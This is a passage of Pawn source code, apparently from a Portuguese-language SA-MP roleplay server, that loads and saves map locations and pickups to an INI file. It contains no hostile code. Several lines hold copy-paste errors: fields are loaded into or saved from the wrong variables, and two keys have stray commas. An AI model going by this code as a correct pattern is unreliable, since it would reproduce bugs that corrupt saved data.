		DOF2_SetFloat(ficheiro, "CamaraMunicipalX", 0);
		DOF2_SetFloat(ficheiro, "CamaraMunicipalY", 0);
		DOF2_SetFloat(ficheiro, "CamaraMunicipalZ", 0);
		DOF2_SetInt(ficheiro, "CamaraMunicipalVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "CamaraMunicipalInterior", 0);
		DOF2_SetInt(ficheiro, "CamaraMunicipalPickupID", 1239);
  		DOF2_SetString(ficheiro, "NewsMusica1", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica2", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica3", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica4", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica5", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica6", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica1Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica2Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica3Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica4Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica5Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica6Alterador", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica1Nome", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica2Nome", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica3Nome", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica4Nome", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica5Nome", "Unused");
  		DOF2_SetString(ficheiro, "NewsMusica6Nome", "Unused");
		DOF2_SetFloat(ficheiro, "AeroportoX", 0);
		DOF2_SetFloat(ficheiro, "AeroportoY", 0);
		DOF2_SetFloat(ficheiro, "AeroportoZ", 0);
		DOF2_SetInt(ficheiro, "AeroportoVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "AeroportoInterior", 0);
		DOF2_SetInt(ficheiro, "AeroportoPickupID", 1239);
		DOF2_SetFloat(ficheiro, "ComprarIscoX", 0);
		DOF2_SetFloat(ficheiro, "ComprarIscoY", 0);
		DOF2_SetFloat(ficheiro, "ComprarIscoZ", 0);
		DOF2_SetInt(ficheiro, "ComprarIscoVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "ComprarIscoInterior", 0);
        DOF2_SetInt(ficheiro, "ComprarIscoPickupID", 1274);
		DOF2_SetFloat(ficheiro, "LotaX", 0);
		DOF2_SetFloat(ficheiro, "LotaY", 0);
		DOF2_SetFloat(ficheiro, "LotaZ", 0);
		DOF2_SetInt(ficheiro, "LotaVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "LotaInterior", 0);
        DOF2_SetInt(ficheiro, "LotaPickupID", 1600);
		DOF2_SetFloat(ficheiro, "FabricaX", 0);
		DOF2_SetFloat(ficheiro, "FabricaY", 0);
		DOF2_SetFloat(ficheiro, "FabricaZ", 0);
		DOF2_SetInt(ficheiro, "FabricaVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "FabricaInterior", 0);
        DOF2_SetInt(ficheiro, "FabricaPickupID", 1274);
		
		DOF2_SaveFile();
	}
	else
	{
 		oInfo[0][RegistoCounter] = DOF2_GetInt(ficheiro, "RegistoCounter");
		oInfo[0][LicX] = DOF2_GetFloat(ficheiro, "LicX");
		oInfo[0][LicY] = DOF2_GetFloat(ficheiro, "LicY");
		oInfo[0][LicZ] = DOF2_GetFloat(ficheiro, "LicZ");
		oInfo[0][LicPickupID] = DOF2_GetInt(ficheiro, "LicPickupID");
		oInfo[0][LicVirtualWorld] = DOF2_GetInt(ficheiro, "LicVirtualWorld");
		oInfo[0][LicInterior] = DOF2_GetInt(ficheiro, "LicInterior");
 		oInfo[0][EmpregoX] = DOF2_GetFloat(ficheiro, "EmpregoX");
		oInfo[0][EmpregoY] = DOF2_GetFloat(ficheiro, "EmpregoY");
		oInfo[0][EmpregoZ] = DOF2_GetFloat(ficheiro, "EmpregoZ");
		oInfo[0][EmpregoPickupID] = DOF2_GetInt(ficheiro, "EmpregoPickupID");
		oInfo[0][EmpregoVirtualWorld] = DOF2_GetInt(ficheiro, "EmpregoVirtualWorld");
		oInfo[0][EmpregoInterior] = DOF2_GetInt(ficheiro, "EmpregoInterior");
 		oInfo[0][PrenderX] = DOF2_GetFloat(ficheiro, "PrenderX");
		oInfo[0][PrenderY] = DOF2_GetFloat(ficheiro, "PrenderY");
		oInfo[0][PrenderZ] = DOF2_GetFloat(ficheiro, "PrenderZ");
		oInfo[0][PrenderVirtualWorld] = DOF2_GetInt(ficheiro, "PrenderVirtualWorld");
		oInfo[0][PrenderInterior] = DOF2_GetInt(ficheiro, "PrenderInterior");
		oInfo[0][Impostos] = DOF2_GetInt(ficheiro, "Impostos");
		oInfo[0][FundoDesemprego] = DOF2_GetInt(ficheiro, "FundoDesemprego");
 		oInfo[0][ComprarDrogasX] = DOF2_GetFloat(ficheiro, "ComprarDrogasX");
		oInfo[0][ComprarDrogasY] = DOF2_GetFloat(ficheiro, "ComprarDrogasY");
		oInfo[0][ComprarDrogasZ] = DOF2_GetFloat(ficheiro, "ComprarDrogasZ");
		oInfo[0][PrenderVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarDrogasVirtualWorld");
		oInfo[0][PrenderInterior] = DOF2_GetInt(ficheiro, "ComprarDrogasInterior");
 		oInfo[0][ComprarMateriaisX] = DOF2_GetFloat(ficheiro, "ComprarMateriaisX");
		oInfo[0][ComprarMateriaisY] = DOF2_GetFloat(ficheiro, "ComprarMateriaisY");
		oInfo[0][ComprarMateriaisZ] = DOF2_GetFloat(ficheiro, "ComprarMateriaisZ");
		oInfo[0][ComprarMateriaisVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarMateriaisVirtualWorld");
		oInfo[0][ComprarMateriaisInterior] = DOF2_GetInt(ficheiro, "ComprarMateriaisInterior");
  		oInfo[0][EntregarDrogasX] = DOF2_GetFloat(ficheiro, "EntregarDrogasX");
		oInfo[0][EntregarDrogasY] = DOF2_GetFloat(ficheiro, "EntregarDrogasY");
		oInfo[0][EntregarDrogasZ] = DOF2_GetFloat(ficheiro, "EntregarDrogasZ");
		oInfo[0][EntregarDrogasVirtualWorld] = DOF2_GetInt(ficheiro, "EntregarDrogasVirtualWorld");
		oInfo[0][EntregarDrogasInterior] = DOF2_GetInt(ficheiro, "EntregarDrogasInterior");
   		oInfo[0][EntregarMateriaisX] = DOF2_GetFloat(ficheiro, "EntregarMateriaisX");
		oInfo[0][EntregarMateriaisY] = DOF2_GetFloat(ficheiro, "EntregarMateriaisY");
		oInfo[0][EntregarMateriaisZ] = DOF2_GetFloat(ficheiro, "EntregarMateriaisZ");
		oInfo[0][EntregarMateriaisVirtualWorld] = DOF2_GetInt(ficheiro, "EntregarMateriaisVirtualWorld");
		oInfo[0][EntregarMateriaisInterior] = DOF2_GetInt(ficheiro, "EntregarMateriaisInterior");
  		oInfo[0][TunningX] = DOF2_GetFloat(ficheiro, "TunningX");
		oInfo[0][TunningY] = DOF2_GetFloat(ficheiro, "TunningY");
		oInfo[0][TunningZ] = DOF2_GetFloat(ficheiro, "TunningZ");
		oInfo[0][TunningVirtualWorld] = DOF2_GetInt(ficheiro, "TunningVirtualWorld");
		oInfo[0][TunningInterior] = DOF2_GetInt(ficheiro, "TunningInterior");
		oInfo[0][TunningPickupID] = DOF2_GetInt(ficheiro, "TunningPickupID");
  		oInfo[0][Banco1X] = DOF2_GetFloat(ficheiro, "Banco1X");
		oInfo[0][Banco1Y] = DOF2_GetFloat(ficheiro, "Banco1Y");
		oInfo[0][Banco1Z] = DOF2_GetFloat(ficheiro, "Banco1Z");
		oInfo[0][Banco1VirtualWorld] = DOF2_GetInt(ficheiro, "Banco1VirtualWorld");
		oInfo[0][Banco1Interior] = DOF2_GetInt(ficheiro, "Banco1Interior");
		oInfo[0][Banco1PickupID] = DOF2_GetInt(ficheiro, "Banco1PickupID");
   		oInfo[0][Banco2X] = DOF2_GetFloat(ficheiro, "Banco2X");
		oInfo[0][Banco2Y] = DOF2_GetFloat(ficheiro, "Banco2Y");
		oInfo[0][Banco2Z] = DOF2_GetFloat(ficheiro, "Banco2Z");
		oInfo[0][Banco2VirtualWorld] = DOF2_GetInt(ficheiro, "Banco2VirtualWorld");
		oInfo[0][Banco2Interior] = DOF2_GetInt(ficheiro, "Banco2Interior");
        oInfo[0][Banco2PickupID] = DOF2_GetInt(ficheiro, "Banco2PickupID");
        oInfo[0][PrecoAtestarG] = DOF2_GetInt(ficheiro, "PrecoAtestarG");
  		oInfo[0][PoliciaX] = DOF2_GetFloat(ficheiro, "PoliciaX");
		oInfo[0][PoliciaY] = DOF2_GetFloat(ficheiro, "PoliciaY");
		oInfo[0][PoliciaZ] = DOF2_GetFloat(ficheiro, "PoliciaZ");
		oInfo[0][PoliciaVirtualWorld] = DOF2_GetInt(ficheiro, "PoliciaVirtualWorld");
		oInfo[0][PoliciaInterior] = DOF2_GetInt(ficheiro, "PoliciaInterior");
		oInfo[0][PoliciaPickupID] = DOF2_GetInt(ficheiro, "PoliciaPickupID");
  		oInfo[0][ApreendidosX] = DOF2_GetFloat(ficheiro, "ApreendidosX");
		oInfo[0][ApreendidosY] = DOF2_GetFloat(ficheiro, "ApreendidosY");
		oInfo[0][ApreendidosZ] = DOF2_GetFloat(ficheiro, "ApreendidosZ");
		oInfo[0][ApreendidosA] = DOF2_GetFloat(ficheiro, "ApreendidosA");
		oInfo[0][ApreendidosVirtualWorld] = DOF2_GetInt(ficheiro, "ApreendidosVirtualWorld");
		oInfo[0][ApreendidosInterior] = DOF2_GetInt(ficheiro, "ApreendidosInterior");
  		oInfo[0][EntradaApreendidosX] = DOF2_GetFloat(ficheiro, "EntradaApreendidosX");
		oInfo[0][EntradaApreendidosY] = DOF2_GetFloat(ficheiro, "EntradaApreendidosY");
		oInfo[0][EntradaApreendidosZ] = DOF2_GetFloat(ficheiro, "EntradaApreendidosZ");
		oInfo[0][EntradaApreendidosA] = DOF2_GetFloat(ficheiro, "EntradaApreendidosA");
		oInfo[0][EntradaApreendidosVirtualWorld] = DOF2_GetInt(ficheiro, "EntradaApreendidosVirtualWorld");
		oInfo[0][EntradaApreendidosInterior] = DOF2_GetInt(ficheiro, "EntradaApreendidosInterior");
  		oInfo[0][VenderVeiculoX] = DOF2_GetFloat(ficheiro, "VenderVeiculoX");
		oInfo[0][VenderVeiculoY] = DOF2_GetFloat(ficheiro, "VenderVeiculoY");
		oInfo[0][VenderVeiculoZ] = DOF2_GetFloat(ficheiro, "VenderVeiculoZ");
		oInfo[0][CamaraMunicipalX] = DOF2_GetFloat(ficheiro, "CamaraMunicipalX");
		oInfo[0][CamaraMunicipalY] = DOF2_GetFloat(ficheiro, "CamaraMunicipalY");
		oInfo[0][CamaraMunicipalZ] = DOF2_GetFloat(ficheiro, "CamaraMunicipalZ");
		oInfo[0][CamaraMunicipalVirtualWorld] = DOF2_GetInt(ficheiro, "CamaraMunicipalVirtualWorld");
		oInfo[0][CamaraMunicipalInterior] = DOF2_GetInt(ficheiro, "CamaraMunicipalInterior");
		oInfo[0][CamaraMunicipalPickupID] = DOF2_GetInt(ficheiro, "CamaraMunicipalPickupID");
		format(oInfo[0][NewsMusica1], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica1"));
		format(oInfo[0][NewsMusica2], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica2"));
		format(oInfo[0][NewsMusica3], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica3"));
		format(oInfo[0][NewsMusica4], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica4"));
		format(oInfo[0][NewsMusica5], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica5"));
		format(oInfo[0][NewsMusica6], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica6"));
 		format(oInfo[0][NewsMusica1Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica1Alterador"));
		format(oInfo[0][NewsMusica2Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica2Alterador"));
		format(oInfo[0][NewsMusica3Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica3Alterador"));
		format(oInfo[0][NewsMusica4Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica4Alterador"));
		format(oInfo[0][NewsMusica5Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica5Alterador"));
		format(oInfo[0][NewsMusica6Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica6Alterador"));
 		format(oInfo[0][NewsMusica1Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica1Nome"));
		format(oInfo[0][NewsMusica2Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica2Nome"));
		format(oInfo[0][NewsMusica3Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica3Nome"));
		format(oInfo[0][NewsMusica4Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica4Nome"));
		format(oInfo[0][NewsMusica5Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica5Nome"));
		format(oInfo[0][NewsMusica6Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica6Nome"));
		oInfo[0][ImpostoCarros] = DOF2_GetInt(ficheiro, "ImpostoCarros");
		oInfo[0][ImpostoCasas] = DOF2_GetInt(ficheiro, "ImpostoCasas");
		oInfo[0][ImpostoLojas] = DOF2_GetInt(ficheiro, "ImpostoLojas");
		oInfo[0][AeroportoX] = DOF2_GetFloat(ficheiro, "AeroportoX");
		oInfo[0][AeroportoY] = DOF2_GetFloat(ficheiro, "AeroportoY");
		oInfo[0][AeroportoZ] = DOF2_GetFloat(ficheiro, "AeroportoZ");
		oInfo[0][AeroportoVirtualWorld] = DOF2_GetInt(ficheiro, "AeroportoVirtualWorld");
		oInfo[0][AeroportoInterior] = DOF2_GetInt(ficheiro, "AeroportoInterior");
		oInfo[0][AeroportoPickupID] = DOF2_GetInt(ficheiro, "AeroportoPickupID");
   		oInfo[0][ComprarIscoX] = DOF2_GetFloat(ficheiro, "ComprarIscoX");
		oInfo[0][ComprarIscoY] = DOF2_GetFloat(ficheiro, "ComprarIscoY");
		oInfo[0][ComprarIscoZ] = DOF2_GetFloat(ficheiro, "ComprarIscoZ");
		oInfo[0][ComprarIscoVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarIscoVirtualWorld");
		oInfo[0][ComprarIscoInterior] = DOF2_GetInt(ficheiro, "ComprarIscoInterior");
        oInfo[0][ComprarIscoPickupID] = DOF2_GetInt(ficheiro, "ComprarIscoPickupID");
   		oInfo[0][LotaX] = DOF2_GetFloat(ficheiro, "LotaX");
		oInfo[0][LotaY] = DOF2_GetFloat(ficheiro, "LotaY");
		oInfo[0][LotaZ] = DOF2_GetFloat(ficheiro, "LotaZ");
		oInfo[0][LotaVirtualWorld] = DOF2_GetInt(ficheiro, "LotaVirtualWorld");
		oInfo[0][LotaInterior] = DOF2_GetInt(ficheiro, "LotaInterior");
        oInfo[0][LotaPickupID] = DOF2_GetInt(ficheiro, "LotaPickupID");
   		oInfo[0][FabricaX] = DOF2_GetFloat(ficheiro, "FabricaX");
		oInfo[0][FabricaY] = DOF2_GetFloat(ficheiro, "FabricaY");
		oInfo[0][FabricaZ] = DOF2_GetFloat(ficheiro, "FabricaZ");
		oInfo[0][FabricaVirtualWorld] = DOF2_GetInt(ficheiro, "FabricaVirtualWorld");
		oInfo[0][FabricaInterior] = DOF2_GetInt(ficheiro, "FabricaInterior");
        oInfo[0][FabricaPickupID] = DOF2_GetInt(ficheiro, "FabricaPickupID");
		
 		AeroportoPickup = CreateDynamicPickup(oInfo[0][AeroportoPickupID], 1, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], -1, -1, -1, 100.0);
		AeroportoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Comprar bilhete 100$ {99FF00}]\n '/comprarbilhete'", COLOR_WHITE, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
		
		CamaraMunicipalPickup = CreateDynamicPickup(oInfo[0][CamaraMunicipalPickupID], 1, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], -1, -1, -1, 100.0);
		CamaraMunicipalLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Câmara Municipal {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
		
        VenderVeiculoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/venderveiculo {99FF00}]", COLOR_WHITE, oInfo[0][VenderVeiculoX], oInfo[0][VenderVeiculoY], oInfo[0][VenderVeiculoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

		PoliciaPickup = CreateDynamicPickup(oInfo[0][PoliciaPickupID], 1, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], -1, -1, -1, 100.0);
		PoliciaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Balcão PSP {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
        
        BancoPickup[0] = CreateDynamicPickup(oInfo[0][Banco1PickupID], 1, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], -1, -1, -1, 100.0);
        BancoLabel[0] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

        BancoPickup[1] = CreateDynamicPickup(oInfo[0][Banco2PickupID], 1, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], -1, -1, -1, 100.0);
        BancoLabel[1] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

		TunningPickup = CreateDynamicPickup(oInfo[0][TunningPickupID], 1, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], -1, -1, -1, 100.0);
		TunningLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Tuning {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
		
		LicPickup = CreateDynamicPickup(oInfo[0][LicPickupID], 1, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], -1, -1, -1, 100.0);
		LicLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/licencas {99FF00}]", COLOR_WHITE, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

        CEPickup = CreateDynamicPickup(oInfo[0][EmpregoPickupID], 1, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], -1, -1, -1, 100.0);
		CELabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Centro de Emprego {99FF00}] \n{99FF00}'n'", COLOR_WHITE, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
		
		PrenderLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Prender {99FF00}]", COLOR_WHITE, oInfo[0][PrenderX], oInfo[0][PrenderY], oInfo[0][PrenderZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

		IscoPickup = CreateDynamicPickup(oInfo[0][ComprarIscoPickupID], 1, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ], -1, -1, -1, 100.0);
		IscoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Loja da Lota {99FF00}] \n{99FF00}'/comprarisco'", COLOR_WHITE, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

		LotaPickup = CreateDynamicPickup(oInfo[0][LotaPickupID], 1, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], -1, -1, -1, 100.0);
		LotaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Lota {99FF00}] \n{99FF00}'/venderpeixe'", COLOR_WHITE, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
		
		FabricaPickup = CreateDynamicPickup(oInfo[0][FabricaPickupID], 1, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], -1, -1, -1, 100.0);
		FabricaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Fábrica {99FF00}] \n{99FF00}'/comprarprodutos'", COLOR_WHITE, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Outros carregados [Total de registos: %d] (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);

	return 1;
}

public GuardarOutros()
{
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Outros.ini");

	DOF2_SetInt(ficheiro, "RegistoCounter", oInfo[0][RegistoCounter]);
	DOF2_SetFloat(ficheiro, "LicX", oInfo[0][LicX]);
	DOF2_SetFloat(ficheiro, "LicY", oInfo[0][LicY]);
	DOF2_SetFloat(ficheiro, "LicZ", oInfo[0][LicZ]);
	DOF2_SetInt(ficheiro, "LicPickupID", oInfo[0][LicPickupID]);
	DOF2_SetInt(ficheiro, "LicVirtualWorld", oInfo[0][LicVirtualWorld]);
	DOF2_SetInt(ficheiro, "LicInterior", oInfo[0][LicInterior]);
	DOF2_SetFloat(ficheiro, "EmpregoX", oInfo[0][EmpregoX]);
	DOF2_SetFloat(ficheiro, "EmpregoY", oInfo[0][EmpregoY]);
	DOF2_SetFloat(ficheiro, "EmpregoZ", oInfo[0][EmpregoZ]);
	DOF2_SetInt(ficheiro, "EmpregoPickupID", oInfo[0][EmpregoPickupID]);
	DOF2_SetInt(ficheiro, "EmpregoVirtualWorld", oInfo[0][EmpregoVirtualWorld]);
	DOF2_SetInt(ficheiro, "EmpregoInterior", oInfo[0][EmpregoInterior]);
	DOF2_SetFloat(ficheiro, "PrenderX", oInfo[0][PrenderX]);
	DOF2_SetFloat(ficheiro, "PrenderY", oInfo[0][PrenderY]);
	DOF2_SetFloat(ficheiro, "PrenderZ", oInfo[0][PrenderZ]);
	DOF2_SetInt(ficheiro, "PrenderVirtualWorld", oInfo[0][PrenderVirtualWorld]);
	DOF2_SetInt(ficheiro, "PrenderInterior", oInfo[0][PrenderInterior]);
	DOF2_SetInt(ficheiro, "Impostos", oInfo[0][PrenderVirtualWorld]);
	DOF2_SetInt(ficheiro, "FundoDesemprego", oInfo[0][PrenderInterior]);
	DOF2_SetFloat(ficheiro, "ComprarDrogasX", oInfo[0][ComprarDrogasX]);
	DOF2_SetFloat(ficheiro, "ComprarDrogasY", oInfo[0][ComprarDrogasY]);
	DOF2_SetFloat(ficheiro, "ComprarDrogasZ", oInfo[0][ComprarDrogasZ]);
	DOF2_SetInt(ficheiro, "ComprarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
	DOF2_SetInt(ficheiro, "ComprarDrogasInterior", oInfo[0][ComprarDrogasInterior]);
	DOF2_SetFloat(ficheiro, "ComprarMateriaisX", oInfo[0][ComprarMateriaisX]);
	DOF2_SetFloat(ficheiro, "ComprarMateriaisY", oInfo[0][ComprarMateriaisY]);
	DOF2_SetFloat(ficheiro, "ComprarMateriaisZ", oInfo[0][ComprarMateriaisZ]);
	DOF2_SetInt(ficheiro, "ComprarMateriaisVirtualWorld", oInfo[0][ComprarMateriaisVirtualWorld]);
	DOF2_SetInt(ficheiro, "ComprarMateriaisInterior", oInfo[0][ComprarMateriaisInterior]);
	DOF2_SetFloat(ficheiro, "EntregarDrogasX", oInfo[0][ComprarDrogasX]);
	DOF2_SetFloat(ficheiro, "EntregarDrogasY", oInfo[0][ComprarDrogasY]);
	DOF2_SetFloat(ficheiro, "EntregarDrogasZ", oInfo[0][ComprarDrogasZ]);
	DOF2_SetInt(ficheiro, "EntregarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
	DOF2_SetInt(ficheiro, "EntregarDrogasInterior", oInfo[0][EntregarDrogasInterior]);
	DOF2_SetFloat(ficheiro, "EntregarMateriaisX", oInfo[0][EntregarMateriaisX]);
	DOF2_SetFloat(ficheiro, "EntregarMateriaisY", oInfo[0][EntregarMateriaisY]);
	DOF2_SetFloat(ficheiro, "EntregarMateriaisZ", oInfo[0][EntregarMateriaisZ]);
	DOF2_SetInt(ficheiro, "EntregarMateriaisVirtualWorld", oInfo[0][EntregarMateriaisVirtualWorld]);
	DOF2_SetInt(ficheiro, "EntregarMateriaisInterior", oInfo[0][EntregarMateriaisInterior]);
	DOF2_SetFloat(ficheiro, "TunningX", oInfo[0][TunningX]);
	DOF2_SetFloat(ficheiro, "TunningY", oInfo[0][TunningY]);
	DOF2_SetFloat(ficheiro, "TunningZ", oInfo[0][TunningZ]);
	DOF2_SetInt(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
	DOF2_SetInt(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
	DOF2_SetInt(ficheiro, "TunningPickupID", oInfo[0][TunningPickupID]);
	DOF2_SetFloat(ficheiro, "Banco1X", oInfo[0][Banco1X]);
	DOF2_SetFloat(ficheiro, "Banco1Y", oInfo[0][Banco1Y]);
	DOF2_SetFloat(ficheiro, "Banco1Z", oInfo[0][Banco1Z]);
	DOF2_SetInt(ficheiro, "Banco1VirtualWorld", oInfo[0][Banco1VirtualWorld]);
	DOF2_SetInt(ficheiro, "Banco1Interior,", oInfo[0][Banco1Interior]);
	DOF2_SetInt(ficheiro, "Banco1PickupID", oInfo[0][Banco1PickupID]);
	DOF2_SetFloat(ficheiro, "Banco2X", oInfo[0][Banco2X]);
	DOF2_SetFloat(ficheiro, "Banco2Y", oInfo[0][Banco2Y]);
	DOF2_SetFloat(ficheiro, "Banco2Z", oInfo[0][Banco2Z]);
	DOF2_SetInt(ficheiro, "Banco2VirtualWorld", oInfo[0][Banco2VirtualWorld]);
	DOF2_SetInt(ficheiro, "Banco2Interior,", oInfo[0][Banco2Interior]);
	DOF2_SetInt(ficheiro, "Banco2PickupID", oInfo[0][Banco2PickupID]);
	DOF2_SetInt(ficheiro, "PrecoAtestarG", oInfo[0][PrecoAtestarG]);
	DOF2_SetFloat(ficheiro, "PoliciaX", oInfo[0][PoliciaX]);
	DOF2_SetFloat(ficheiro, "PoliciaY", oInfo[0][PoliciaY]);
	DOF2_SetFloat(ficheiro, "PoliciaZ", oInfo[0][PoliciaZ]);
	DOF2_SetInt(ficheiro, "PoliciaVirtualWorld", oInfo[0][PoliciaVirtualWorld]);
	DOF2_SetInt(ficheiro, "PoliciaInterior", oInfo[0][PoliciaInterior]);
	DOF2_SetInt(ficheiro, "PoliciaPickupID", oInfo[0][PoliciaPickupID]);
	DOF2_SetFloat(ficheiro, "TunningX", oInfo[0][TunningX]);
	DOF2_SetFloat(ficheiro, "TunningY", oInfo[0][TunningY]);
	DOF2_SetFloat(ficheiro, "TunningZ", oInfo[0][TunningZ]);
	DOF2_SetInt(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
	DOF2_SetInt(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
	DOF2_SetFloat(ficheiro, "ApreendidosX", oInfo[0][ApreendidosX]);
	DOF2_SetFloat(ficheiro, "ApreendidosY", oInfo[0][ApreendidosY]);
	DOF2_SetFloat(ficheiro, "ApreendidosZ", oInfo[0][ApreendidosZ]);
	DOF2_SetFloat(ficheiro, "ApreendidosA", oInfo[0][ApreendidosA]);
	DOF2_SetInt(ficheiro, "ApreendidosVirtualWorld", oInfo[0][ApreendidosVirtualWorld]);
	DOF2_SetInt(ficheiro, "ApreendidosInterior", oInfo[0][ApreendidosInterior]);
	DOF2_SetFloat(ficheiro, "EntradaApreendidosX", oInfo[0][EntradaApreendidosX]);
	DOF2_SetFloat(ficheiro, "EntradaApreendidosY", oInfo[0][EntradaApreendidosY]);
	DOF2_SetFloat(ficheiro, "EntradaApreendidosZ", oInfo[0][EntradaApreendidosZ]);
	DOF2_SetFloat(ficheiro, "EntradaApreendidosA", oInfo[0][EntradaApreendidosA]);
